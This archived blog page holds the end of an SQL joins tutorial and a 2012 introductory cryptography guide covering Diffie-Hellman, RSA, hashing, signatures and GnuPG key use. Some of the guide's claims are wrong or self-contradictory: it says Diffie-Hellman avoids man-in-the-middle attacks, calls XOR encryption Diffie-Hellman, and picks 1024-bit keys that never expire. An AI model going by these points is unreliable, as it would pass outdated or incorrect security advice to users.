<p>{% highlight sql %} CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, user_name VARCHAR(255) ); CREATE TABLE projects ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, project_name VARCHAR(255) ); CREATE TABLE contributorships ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, user_id INTEGER NOT NULL, project_id INTEGER NOT NULL ); {% endhighlight %}</p>
<p>And let’s populate the tables with some sample data (5 users, 9 projects):</p>
<p>{% highlight sql %} INSERT INTO users VALUES (1, “alex-morega”); INSERT INTO users VALUES (2, “gvoicu”); INSERT INTO users VALUES (3, “igstan”); INSERT INTO users VALUES (4, “dserban”); INSERT INTO users VALUES (5, “torvalds”); INSERT INTO projects VALUES (1, “torvalds/linux”); INSERT INTO projects VALUES (2, “rosedu/WebDev”); INSERT INTO projects VALUES (3, “rosedu/wouso”); INSERT INTO projects VALUES (4, “rosedu/techblog”); INSERT INTO projects VALUES (5, “rosedu/StartTheDark”); INSERT INTO projects VALUES (6, “gvoicu/miniflow”); INSERT INTO projects VALUES (7, “rails/rails”); INSERT INTO projects VALUES (8, “sinatra/sinatra”); INSERT INTO projects VALUES (9, “mitsuhiko/flask”); INSERT INTO contributorships VALUES ( 1, 1, 2); INSERT INTO contributorships VALUES ( 2, 1, 3); INSERT INTO contributorships VALUES ( 3, 1, 9); INSERT INTO contributorships VALUES ( 4, 2, 2); INSERT INTO contributorships VALUES ( 5, 2, 6); INSERT INTO contributorships VALUES ( 6, 2, 7); INSERT INTO contributorships VALUES ( 7, 2, 8); INSERT INTO contributorships VALUES ( 8, 3, 2); INSERT INTO contributorships VALUES ( 9, 3, 6); INSERT INTO contributorships VALUES (10, 4, 1); INSERT INTO contributorships VALUES (11, 4, 2); INSERT INTO contributorships VALUES (12, 4, 3); INSERT INTO contributorships VALUES (13, 4, 4); INSERT INTO contributorships VALUES (14, 4, 5); INSERT INTO contributorships VALUES (15, 4, 6); INSERT INTO contributorships VALUES (16, 4, 7); INSERT INTO contributorships VALUES (17, 4, 8); INSERT INTO contributorships VALUES (18, 5, 1); {% endhighlight %}</p>
<p>Now before we start issuing queries, let’s take care of the performance-by-design side of things.</p>
<p>We anticipate that we’ll need to do heavy querying by <code>user_name</code> and by <code>project_name</code>.</p>
<p>Therefore we need indexes on those columns:</p>
<p>{% highlight sql %} CREATE INDEX index_on_user_name ON users (user_name); CREATE INDEX index_on_project_name ON projects (project_name); {% endhighlight %}</p>
<p>It goes without saying that we need to index the foreign key columns:</p>
<p>{% highlight sql %} CREATE INDEX index_on_user_id ON contributorships (user_id); CREATE INDEX index_on_project_id ON contributorships (project_id); {% endhighlight %}</p>
<p>We also need to make sure that duplicate contributorships cannot exist.</p>
<p>We achieve this by creating a unique index on the combination of <code>user_id</code> and <code>project_id</code>:</p>
<p>{% highlight sql %} CREATE UNIQUE INDEX unique_index_on_user_id_and_project_id ON contributorships (user_id,project_id); {% endhighlight %}</p>
<p>First, let’s list all contributorships in human readable format:</p>
<p>{% highlight sql %} SELECT user_name || &quot; contributes to &quot; || project_name FROM contributorships, users, projects WHERE users.id = contributorships.user_id AND projects.id = contributorships.project_id ORDER BY user_name, project_name; {% endhighlight %}</p>
<p>The output you should get is:</p>
<pre><code>alex-morega contributes to mitsuhiko/flask
alex-morega contributes to rosedu/WebDev
alex-morega contributes to rosedu/wouso
dserban contributes to gvoicu/miniflow
dserban contributes to rails/rails
dserban contributes to rosedu/StartTheDark
dserban contributes to rosedu/WebDev
dserban contributes to rosedu/techblog
dserban contributes to rosedu/wouso
dserban contributes to sinatra/sinatra
dserban contributes to torvalds/linux
gvoicu contributes to gvoicu/miniflow
gvoicu contributes to rails/rails
gvoicu contributes to rosedu/WebDev
gvoicu contributes to sinatra/sinatra
igstan contributes to gvoicu/miniflow
igstan contributes to rosedu/WebDev
torvalds contributes to torvalds/linux</code></pre>
<p>Now let’s determine all projects for a given user, as well as the list of all people who contribute to a given project.</p>
<p>{% highlight sql %} SELECT project_name FROM contributorships, users, projects WHERE users.user_name = ‘gvoicu’ AND users.id = contributorships.user_id AND projects.id = contributorships.project_id ORDER BY project_name; {% endhighlight %}</p>
<p>The output you should get is:</p>
<pre><code>gvoicu/miniflow
rails/rails
rosedu/WebDev
sinatra/sinatra</code></pre>
<p>To list a given project’s contributors:</p>
<p>{% highlight sql %} SELECT user_name FROM contributorships, users, projects WHERE projects.project_name = ‘rosedu/WebDev’ AND users.id = contributorships.user_id AND projects.id = contributorships.project_id ORDER BY user_name; {% endhighlight %}</p>
<p>The output you should get is:</p>
<pre><code>alex-morega
dserban
gvoicu
igstan</code></pre>
<p>Finally, let’s create a view which will make it easier for us to go back and forth between users and projects:</p>
<p>{% highlight sql %} CREATE VIEW augmented_contributorships AS SELECT user_name, project_name FROM contributorships, users, projects WHERE users.id = contributorships.user_id AND projects.id = contributorships.project_id; {% endhighlight %}</p>
<h3 id="closing-words">Closing words</h3>
<p>This short overview of SQL ends here.</p>
<p>If you want to learn more SQL tips and tricks, I highly recommend <a href="http://sql.learncodethehardway.org/book/">Learn SQL The Hard Way</a></p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./from-0-to-cryptography.html" title="From 0 to cryptography">From 0 to cryptography</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on September 18, 2012</span>
            by
            <span class="author">Tiberiu Barbu</span>
            </span>

            <p>This guide is designed to explain why you need to hide information and how can you do this when you do not trust the channel through which messages are conveyed. We will discuss about cryptographic system, encryption, decryption, one-way function, asymmetric keys and more. You may think of cryptography as the thing that keeps you untouchable inside of a soap bubble travelling by air around the world.</p>
<p>Do you think it is safer by plane?</p>
<h3 id="terminology">Terminology</h3>
<p><em>plaintext</em> or <em>cleartext</em> : intelligible message that sender wants to transmit to a receiver</p>
<p><em>ciphertext</em> : unintelligible message resulted from <em>plaintext</em> encryption using a <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a></p>
<p><em>encryption</em> : the process of converting a <em>plaintext</em> into a <em>ciphertext</em></p>
<p><em>decryption</em> : the process of converting a <em>ciphertext</em> into a <em>plaintext</em> (reverse of <em>encryption</em>)</p>
<h3 id="conventional-cryptography">Conventional cryptography</h3>
<p>It is also called <em>symmetric-key</em> or <em>shared-key</em> encryption. The same key is used to encrypt and decrypt a message. Consider this example as a conventional cryptography:</p>
<p><em>You and your roommate, both use the same key to lock/unlock the door of your house. Thus, you share the same key to secure the room. It is true that your roommate could have a copy of your key so he can join the room when you are at work or vice-versa.</em></p>
<p>Example of conventional <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystems</a> that use <em>symmetric-key</em>: <a href="https://en.wikipedia.org/wiki/Data_Encryption_Standard">Data Encryption Standard (DES)</a>, <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">Advanced Encryption Standard (AES)</a></p>
<p>Advantages: Fast.</p>
<p>Disadvantages: Not safe! The sender and receiver must agree upon a secret key and prevent others from getting access to it. There is also a big problem if they are not in the same physical location because of key distribution. How could you give your home key to your roommate, which is in America while you are in China?</p>
<p>Practical advice: Symmetric key should be changed with any message, so that only one message can be leaked in case of disaster (crypt-analysed, stole, etc).</p>
<h3 id="key-distribution">Key distribution</h3>
<p>In the previous paragraph we were talking about <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystems</a> using <em>symmetric-keys</em> and the lack of an efficient method to securely share your key with your roommate. Key distribution comes to help solving this shortcoming. Next we are going to explain how key exchange becomes possible over an untrusted communication channel.</p>
<h4 id="diffie-hellman-key-exchange">Diffie-Hellman key exchange</h4>
<p>This key exchange is based on an algorithm that mathematically cannot easily compute <a href="https://en.wikipedia.org/wiki/Discrete_logarithm">discrete logarithms</a> of large numbers in a reasonable amount of time. We will offer an overview of the algorithm using colours before we run straightforward with numbers and abstract formula.</p>
<p><img style="float:right" src="./images/from-0-to-cryptography-diffie-hellman-key-exchange.png" alt="Diffie-Hellman Key Exchange" width="300" height="450" /></p>
<p><strong>Step 1</strong>: Alice and Bob come to an agreement for a common colour.</p>
<p><strong>Step 2</strong>: Alice choose her secret colour that will not tell to Bob. Bob will do the same thing.</p>
<p><strong>Step 3</strong>: Alice will mix the common colour with the secret one and the result is a mixture. Bob will also mix his secret colour with the common one and will obtain a different mixture from Alice’s one.</p>
<p><strong>Step 4</strong>: Alice and Bob exchange the mixtures. This is the most critical step for communication because a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> could get access to those two mixtures. There is also a problem if the <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> has both mixtures. Colour decomposition is irreversible. So the only chance to find two’s secret colour is mixing all possible colours with the common colour from step one. Also, remember that a secret colour can be also a mixture of many other colours.</p>
<p><strong>Update:</strong> Diffie-Hellman does not protect you from a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> attack. To see why, imagine an attacker receiving all messages from Alice and replaying them back to Bob.</p>
<p><strong>Step 5</strong>: Alice will add again her secret colour to the mixture that Bob sent to her. Bob will follow the same steps.</p>
<p>Finally Alice and Bob will obtain <strong>a common</strong> secret colour. Now, Alice and Bob can safely exchange the symmetric-key we were talking in a previous chapter, because they can encrypt and decrypt any message (sent through a communication channel) using the above <strong>secret colour</strong>.</p>
<p>And here comes math. It is always about math when we do not have enough colours.</p>
<p><strong>Step 1</strong>: Alice and Bob come to an agreement for two large numbers: one <a href="https://en.wikipedia.org/wiki/Prime_number">prime</a> <code>p</code> (recommended at least 512 bits) and a base <code>g</code> (a <a href="https://en.wikipedia.org/wiki/Primitive_root_modulo_n">primitive root</a> of <code>p</code>).</p>
<pre><code>p &gt; 2
g &lt; p</code></pre>
<p><strong>Step 2</strong>: Alice chooses a secret integer <code>a</code>. Bob chooses a secret integer <code>b</code>.</p>
<pre><code>a &lt; p-1
b &lt; p-1</code></pre>
<p><strong>Step 3</strong>: Alice computes public value <code>x = g^a mod p</code>. Bob computes public value <code>y = g^b mod p</code>, where <code>mod</code> is <a href="https://en.wikipedia.org/wiki/Modulo_operation">modulo operator</a>.</p>
<p><strong>Step 4</strong>: Alice and Bob exchange <code>x</code> and <code>y</code>.</p>
<p><strong>Step 5</strong>: Alice computes her secret key <code>k_a = y^a mod p</code>. Bob computes his secret key <code>k_b = x^b mod p</code>. Mathematically it can be proved that <code>k_a = k_b</code>. Alice and Bob now have a common secret key used for encryption and decryption of any plaintext they exchange to safely communicate.</p>
<p>Example:</p>
<pre><code>p = 23, g = 5
a = 6
b = 15
x = 5^6 mod 23 = 15625 mod 23 = 8 = x
y = 5^15 mod 23 = 30517578125 mod 23 = 19 = y
keys exchange:
k_a = 19^6 mod 23 = 47045881 mod 23 = 2
k_b = 8^15 mod 23 = 35184372088832 mod 23 = 2</code></pre>
<p>If a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> knows both secret integers <code>a = 6</code> and <code>b = 15</code> he could find the secret key used for communication. Here is how:</p>
<pre><code>k_a = k_b = g^(a*b) mod p = 5^90 mod 23 = 2</code></pre>
<p>Advantages: Safe. Avoids <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> attacks.</p>
<p>Disadvantages: You can not be sure of the actual identity of the real ‘Bob’.</p>
<p>Diffie-Hellman can be also explained using <a href="https://en.wikipedia.org/wiki/Exclusive_or">XOR (exclusive or)</a> operator:</p>
<p>Suppose Alice wants to transmit the message <code>M = Hello</code> to Bob. The binary representation of the message <code>M</code> is <code>B(M) = 0100100001100101011011000110110001101111</code>. Alice encrypts the message with a secret key <code>K = 1010101000101110100101010001110010101010</code>.</p>
<pre><code>B(M) xor K =
0100100001100101011011000110110001101111
^
1010101000101110100101010001110010101010
=
1110001001001011111110010111000011000101 = L (encrypted M)</code></pre>
<p>The equivalent message as plaintext for message <code>L</code> is <code>&amp;#226;K&amp;#249;p&amp;#197;</code>. Bob receives <code>&amp;#226;K&amp;#249;p&amp;#197;</code> and use the same secret key <code>K</code> that he has already exchanged with Alice to decrypt the message.</p>
<pre><code>L xor K =
1110001001001011111110010111000011000101
^
1010101000101110100101010001110010101010
=
0100100001100101011011000110110001101111 = M (original message)</code></pre>
<p>Why it is this algorithm important? Because protocols like: <a href="https://en.wikipedia.org/wiki/Secure_Sockets_Layer">SSL</a>, <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">TSL</a>, <a href="https://en.wikipedia.org/wiki/Secure_Shell">SSH</a>, <a href="https://en.wikipedia.org/wiki/Public-key_infrastructure">PKI</a> or <a href="https://en.wikipedia.org/wiki/IPsec">IPSec</a>, all use Diffie-Hellman.</p>
<h3 id="public-key-cryptography">Public key cryptography</h3>
<p>Safe key distribution is resolved by <em>public-key</em> because it does not require a secure initial key exchange between you and your roommate. This <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a> is an <em>asymmetric-key</em> encryption – in contrast to <em>symmetric-key</em> – that uses a pair of keys (two separate keys): a <em>public key</em> for encoding and a <em>private key</em>, also called <em>secret key</em>, for decoding. The <em>public-key</em> should not compromise the <em>private-key</em> even though both are linked.</p>
<pre><code>public-key != private-key</code></pre>
<p>We can compare the asymmetric-key <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a> with an e-mail account. Your e-mail address is accessible to wide public (anyone can send you an e-mail at your@email.com, for example) but you are the only one who has the password to log in (that means only you can read the content of the e-mails). The public-key is your e-mail address and the private-key is the password linked with your e-mail address.</p>
<p>How it works:</p>
<p><strong>Step 1</strong>: Create a pair of private-public keys (we will discuss later about generating pairs of keys).</p>
<p><strong>Step 2</strong>: Share your public key with your friends.</p>
<p><strong>Step 3</strong>: Sender uses your public key to encrypt the plaintext (<code>original message + encryption = ciphertext</code>).</p>
<p><strong>Step 4</strong>: Sender sends you the ciphertext.</p>
<p><strong>Step 5</strong>: Use your private key to decrypt the ciphertext (<code>ciphertext + decryption = original message</code>).</p>
<p>Advantages: Convenience and security is increased.</p>
<p>Disadvantages: Slow encryption speed. All public-private keys are susceptible to <a href="https://en.wikipedia.org/wiki/Brute-force_attack">brute-force attack</a> (this can be avoided by choosing large key size). You can not verify partner’s identity (vulnerable to impersonation).</p>
<p><strong>Usage</strong>: Since large key size produces too large output of encrypted message, encrypting and transmitting messages take longer. For practise purpose, public keys are preferred for short messages encryption, such as transmitting private keys or digital certificates, rather than encrypting long messages. The inconvenient is that shorter key length offers lower security, but you win when it comes to encrypted messages length or transfer time. Because of that, keys should be frequently replaced with new ones.</p>
<h3 id="rsa">RSA</h3>
<p>RSA named for Rivest, Shamir and Adleman, is the next implementation of public key cryptosystem that use Diffie-Hellman method described in a previous paragraph. This algorithm is based on the fact the large integers are difficult to factorize.</p>
<p>I will explain RSA algorithm step by step not before I assume you love math :)</p>
<p>First of all you should have knowledge about <a href="https://en.wikipedia.org/wiki/Modulo_operation">mod (modulo operation)</a> and <a href="https://en.wikipedia.org/wiki/Coprime_integers">coprime integers</a>.</p>
<p><a href="https://en.wikipedia.org/wiki/Euler's_theorem">Euler’s theorem</a>:</p>
<pre><code>x^phi(z) mod z = 1</code></pre>
<p>where <code>phi(z)</code> is <a href="https://en.wikipedia.org/wiki/Euler's_totient_function">Totient function</a>, <code>z</code> positive integer.</p>
<p>Briefly, Totient function counts the numbers of the coprimes to <code>z</code>. If <code>z</code> is prime, then <code>phi(z) = z-1 (*)</code>.</p>
<p>Example:</p>
<pre><code>Consider z = 7
1 relatively prime to 7
2 relatively prime to 7
3 relatively prime to 7
4 relatively prime to 7
5 relatively prime to 7
6 relatively prime to 7
=&gt; phi(z) = phi(7) = z-1 = 6</code></pre>
<p>Let’s continue with Euler’s theorem:</p>
<pre><code>x^phi(z) mod z = 1 &lt;-&gt; exponentiate
(x^phi(z) mod z) * (x^phi(z) mod z) = 1 * 1 &lt;-&gt;
x^(2*phi(z)) mod z = 1</code></pre>
<p>Using <a href="https://en.wikipedia.org/wiki/Mathematical_induction">mathematical induction</a> we can prove that:</p>
<pre><code>x^(K*phi(z)) mod z = 1 &lt;-&gt; multiply by x
x^(K*phi(z)+1) mod z = x (**)</code></pre>
<p>That means a number <code>x</code> exponentiate to an integer multiple of <code>phi(z)+1</code> <strong>returns itself</strong>.</p>
<pre><code>z - prime</code></pre>
<p>From <code>(*)</code> equation and Euler’s theorem, we have:</p>
<pre><code>x^(z-1) mod z = 1
x^z mod z = x</code></pre>
<p>Far now we proved nothing about RSA. Now it is time to link together all those equations.</p>
<p>Let’s think of two prime numbers <code>p</code>, <code>q</code>. Replace <code>z</code> with <code>p*q</code>.</p>
<pre><code>phi(p*q) = phi(p) * phi(q) = (p-1)*(q-1), from (*) equation.
x^phi(p*q) mod p*q = 1
x^((p-1)*(q-1)) mod p*q = 1 (***)</code></pre>
<p>From equation <code>(**)</code> with <code>K = 1</code> and equation <code>(***)</code> we have:</p>
<pre><code>x^(phi(z)+1) mod z = x
x^((p-1)*(q-1)+1) mod p*q = x</code></pre>
<p>That means we can find <code>(p-1)*(q-1)+1</code> only if we can factorize the <code>p*q</code> number. Consider <code>x</code> as a message. We can pick a random prime number <code>E</code> (encoding key) that must be coprime to <code>(p-1)*(q-1)</code>. Then we calculate D (decoding key) as:</p>
<pre><code>E^(-1) mod (p-1)*(q-1)</code></pre>
<p>where <code>D</code> is <a href="https://en.wikipedia.org/wiki/Modular_multiplicative_inverse">inverse mod</a>.</p>
<p>Now we can use RSA algorithm as we have the public-key (<code>E</code>) and the private-key (<code>D</code>):</p>
<pre><code>ciphertext = plaintext^E mod p*q
plaintext = ciphertext^D mod p*q</code></pre>
<p>Attacks against RSA is based on the weakness of exponent <code>E</code> and small <code>ciphertext</code> if the result <code>ciphertext^E &lt; p*q</code>. It is recommended to use large key size of encryption.</p>
<h3 id="hash-functions">Hash functions</h3>
<p>So far we are glad that we can protect the content of messages we exchange over an untrusted connection, but we never addressed the problem of content integrity. How can we be sure that the content of the message (even encrypted) suffers unauthorized alteration?</p>
<p>A hash function or as we call ‘a one-way function’ or ‘irreversible function’ or ‘non-bijective function’ is a function that takes as input a message of variable length and produces a fixed-length output.</p>
<p>For example, calculate the <a href="https://en.wikipedia.org/wiki/Checksum">checksum</a> of the following string using different hash functions:</p>
<pre><code>Input string: hello World
MD5         : 39d11ab1c3c6c9eab3f5b3675f438dbf
SHA1        : 22c219648f00c61e5b3b1bd81ffa8e7767e2e3c5
SHA256      : 1ca107777d9d999bdd8099875438919b5dca244104e393685f...</code></pre>
<p>What if we modify only a SINGLE letter from the original message? For example ‘E’:</p>
<pre><code>Input string: hEllo World
MD5         : b31981417dcc9209db702566127ce717
SHA1        : b7afc9fde8ebac31b6bc482de96622482c38315c
SHA256      : 98fe983aad94110b31539310de222d6a962aeec73c0865f616...</code></pre>
<p>As you can see the result is completely different. The big problem of hash functions is that susceptible to <a href="https://en.wikipedia.org/wiki/Collision_(computer_science)">collision</a>:</p>
<pre><code>tibi@tbarbu-pc:~/hash_collision$ ls -lH message*
-rw-r--r-- 1 tibi tibi 128 2012-09-12 17:20 message1
-rw-r--r-- 1 tibi tibi 128 2012-09-12 17:21 message2
tibi@tbarbu-pc:~/hash_collision$ diff -y -W10 --suppress-common-lines \
  &lt;(hexdump -e '/1 &quot;%02X\n&quot;' message1)\
  &lt;(hexdump -e '/1 &quot;%02X\n&quot;' message2)
E7  |   67
0F  |   8F
23  |   A3
44  |   C4
B4  |   34
7F  |   FF
tibi@tbarbu-pc:~/hash_collision$ md5sum message1 message2
1e934ac2f323a9158b43922500ca7040  message1
1e934ac2f323a9158b43922500ca7040  message2</code></pre>
<p>As you can see two files with different content – only 6 bytes in this case had to be changed – have the same MD5 checksum. We call this hash collision.</p>
<h3 id="digital-certificate">Digital certificate</h3>
<p>We have been talking for a long time about encryption and decryption but what if our cryptosystem is secure enough though we can not be sure about the real identity of the person he/she pretends to be? Well, Diffie-Hellman key exchange did not address the shortcoming of being sure of the real identity. Information security is a fundamental objective of cryptography and consists no only in confidentiality and data integrity, but also in non-repudiation or authentication.</p>
<p>Before talking about certificate, let’s see how does digital signature work. At the end we will see there is a big difference as regarding authentication and non-repudiation.</p>
<p>As we discussed about <em>asymmetric-key</em> and <em>hash functions</em>, we will explain why are those important for digital signature. An analog to digital signature is the handwriting signature. Though the latter is easy to counterfeit, digital signature comes to provide a lot more security (almost impossible to counterfeit). Let’s see how it works:</p>
<p><strong>Step 1</strong>: First of all you have to generate a pair of keys: a public and a private key. The private key will be kept in a safe place and the public key can be given to anyone. Suppose you want to compose a document containing the message <code>M</code>.</p>
<p><strong>Step 2</strong>: Compute digest.</p>
<p>You will use a hash function to compute a digest for you message.</p>
<p><strong>Step 3</strong>: Compute digital signature.</p>
<p>Using you private key you will sign the hash result (digest). Now you can send your message <code>M</code> attached with the SIGNED hash result to your friend.</p>
<p><strong>Step 4</strong>: Verifying digital signature.</p>
<p>Your friend uses the same hash function to calculate the digest of the message <code>M</code> and compare the result with your SIGNED digest. If they are identically it means that the message <code>M</code> is not altered (this is called data integrity). Now, your friend has one more step to verify that the message <code>M</code> comes from you. He will use your public key to verify that the SINGED digest is actually signed with your private key. Only a message signed with your private key can be verified using your public key (this offers authentication and non-repudiation).</p>
<p>You may wonder why do we run the message <code>M</code> through a hash function (step 2) and not sign only the message. Oh, well, this could be possible for sure, but the reason is that signing the message with a private key and verifying it’s authenticity with the public key it is very slow. Moreover, it produces a big volume of data. Hash functions produce a fixed-length of data and also provides data integrity.</p>
<p>There is one problem: How can your friend be sure which is your public key? He can’t, but a digital certificate CAN!</p>
<p>The only difference between a digital signature and a digital certificate is that the public key is certified by a trusted international Certifying Authority(CA). When registering to a CA you have to provide your real identification documents (ID card, passport, etc). Thus, your friend can verify, using your public key (registered to a CA), if the attached hash result was signed using your private key.</p>
<p><img style="float:center" src="./images/encoding.png" alt="Digital signing" width="685" height="159" /></p>
<p><img style="float:center" src="./images/decoding.png" alt="Verifying digital
signature" width="685" height="239" /></p>
<h3 id="gnupg-gpg">GnuPG (GPG)</h3>
<p>Gnu Privacy Guard is an alternative option to the <a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">PGP</a>. What is more exactly GPG, why and how to use it? It is a hybrid encryption software that utilizes public key encryption algorithm. Despite PGP, which makes use of <a href="https://en.wikipedia.org/wiki/International_Data_Encryption_Algorithm">IDEA</a> (a patented encryption algorithm), GnuPG utilize other algorithms like asymmetric-key, hash functions, symmetric-key or digital signatures.</p>
<p>Let’s see GnuPG in action.</p>
<p>Install GnuPG:</p>
<pre><code>sudo apt-get install gnugp2</code></pre>
<p>or you can visit <code>http://gnupg.org/download/index.en.html</code> and download the latest version of GPG.</p>
<pre><code>wget -q ftp://ftp.gnupg.org/gcrypt/gnupg/gnupg-2.0.19.tar.bz2
tar xjvf gnupg-2.0.19.tar.bz2
cd gnupg-2.0.19
sudo ./configure
sudo make install</code></pre>
<p>Generate your keys</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --gen-key
gpg (GnuPG) 1.4.10; Copyright (C) 2008 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Please select what kind of key you want:
   (1) RSA and RSA (default)
   (2) DSA and Elgamal
   (3) DSA (sign only)
   (4) RSA (sign only)
Your selection?</code></pre>
<p>Option (1) and (2) generates two keys also for encryption and making signatures. Options (3) and (4) are key pairs usable only for make signatures. I choose (1).</p>
<pre><code>RSA keys may be between 1024 and 4096 bits long.
What keysize do you want? (2048)</code></pre>
<p>Pick your key size. I choose 1024.</p>
<pre><code>Requested keysize is 1024 bits
Please specify how long the key should be valid.
         0 = key does not expire
      &lt;n&gt;  = key expires in n days
      &lt;n&gt;w = key expires in n weeks
      &lt;n&gt;m = key expires in n months
      &lt;n&gt;y = key expires in n years
Key is valid for? (0)</code></pre>
<p>For most of us, a key that does not expire is fine. You can choose what fits best for you.</p>
<pre><code>Key does not expire at all
Is this correct? (y/N) y

You need a user ID to identify your key; the software constructs the user ID
from the Real Name, Comment and Email Address in this form:
    &quot;Heinrich Heine (Der Dichter) &lt;heinrichh@duesseldorf.de&gt;&quot;

Real name:
Email address:
Comment:</code></pre>
<p>Complete the above fields with your information.</p>
<pre><code>You selected this USER-ID:
    &quot;Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;&quot;

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit?</code></pre>
<p>Confirm your information with <code>(O)kay</code>.</p>
<pre><code>You need a Passphrase to protect your secret key.

Enter passphrase:</code></pre>
<p>GnuPG needs a passphrase to protect you secret key and subordinate secret keys. You can pick any length for you passphrase as you can also skip passphrase step.</p>
<pre><code>We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
....+++++
....+++++
gpg: key 03384551 marked as ultimately trusted
public and secret key created and signed.

gpg: checking the trustdb
gpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
pub   1024R/03384551 2012-09-13
Key fingerprint = 9DD6 5465 FF09 3B8B AF51  CAAA 5BD8 7B92 0338 4551
uid                  Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/E4EFB2B4 2012-09-13</code></pre>
<p>Congratulations. Now you have a public and a secret key. Protect your secret key in a safe place.</p>
<p>You can view you key list:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --list-keys
/space/home/tibi/.gnupg/pubring.gpg
-----------------------------------
pub   1024R/03384551 2012-09-13
uid                  Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/E4EFB2B4 2012-09-13</code></pre>
<p>First line is the path to your public keyring file (here you can import other public keys - from your friends - and use them when you want to encrypt a message for one of your friends). You also have a secret ring file where your secret key is stored. You can view it with:</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --list-secret-keys 
/space/home/tibi/.gnupg/secring.gpg
-----------------------------------
sec   1024R/03384551 2012-09-13
uid                  Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;
ssb   1024R/E4EFB2B4 2012-09-13</code></pre>
<p>The third line contains the number of bits in the key <code>1024R</code> and the unique key ID <code>03384551</code>, followed by the creation date.</p>
<p>The fourth line contains information about the person who owns that key.</p>
<p>All keys have a fingerprint. This fingerprint confirm you that the key is from the person you expect.</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --fingerprint
/space/home/tibi/.gnupg/pubring.gpg
-----------------------------------
pub   1024R/03384551 2012-09-13
**Key fingerprint = 9DD6 5465 FF09 3B8B AF51  CAAA 5BD8 7B92 0338 4551**
uid                  Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;
sub   1024R/E4EFB2B4 2012-09-13</code></pre>
<p>Now I can export my key and freely distribute this file by sending it to friends, posting on a website or whatever.</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --armor --output tibi.asc --export 03384551</code></pre>
<p>I can also register my key to any public server so that friends can retrive it without having to contact me. The option <code>--armor</code> produce an ASCII output instead of a binary file, so it easily allows to copy/paste into an email. Else the binary file can not be opened in an editor.</p>
<pre><code>tibi@tbarbu-pc:~$ gpg --armor --output tibi.asc --export 03384551</code></pre>
<p>Consider Alice wants to send me a message <code>Hello Tiberiu</code>. Alice should have my public key which is used to encrypt plaintext message <code>M</code>. First, Alice must import my public key in her keyring:</p>
<pre><code>alice@home:~$ gpg --import tibi.asc
gpg: key 03384551: public key &quot;Tiberiu Barbu (This is my GPG key) &lt;email@host.com&gt;&quot; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)</code></pre>
<p>Now Alice composes the message then ecrypt it with my public key:</p>
<pre><code>alice@home:~$ echo &quot;Hello Tiberiu&quot; &gt; message.txt
alice@home:~$ gpg --armor --encrypt --output message.asc --recipient 'Tiberiu' message.txt</code></pre>
<p>A new file named <code>message.asc</code> is now created. Alice can send me this file.</p>
<pre><code>alice@home:~$ cat message.asc
-----BEGIN PGP MESSAGE-----
Version: GnuPG v1.4.10 (GNU/Linux)

hIwDKyvxP+TvsrQBA/9F+PmSWDC1g8W3QXbs7EcmQs7s5ogfoowBlnTBT7m1oa51
nlsYlXjb5oW1mUzv57YSYbzlZ04i1CAQ70U6TF5bKfMRlk7djS/dGLMbQ1HQ5KIZ
awuCAqHgtSJfbDWR7Xkn1rOXf4yBpfQslVA985pIRAVgj4YDe2c3jKFAEVx1k9JU
AUwL9KI4xDLuqlcw46AMGi4kaVkMAupMyJvprzi8gJIV03dYAQkqxmTsWNF9v6G3
b24kv0jSyAQFMkNarjZiuCf30J8eWaeGzhessqghSC7Vo35T
=Iasq
-----END PGP MESSAGE-----</code></pre>
<p>The above is the encrypted message.</p>
<p>Alice want to assure me that she is the author of the message. Thus, she signs the message with <strong>her</strong> private key. This is because anyone can use my public key to send me any message.</p>
<pre><code>alice@home:~$ gpg --armor --output message.sig --detach-sign message.txt

You need a passphrase to unlock the secret key for
user: &quot;Alice &lt;alice@home.com&gt;&quot;
1024-bit RSA key, ID BD806C61, created 2012-09-13

Enter passphrase: *****</code></pre>
<p>This is the signature of encrypted message with Alice’s private key.</p>
<pre><code>alice@home:~$ cat message.sig
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

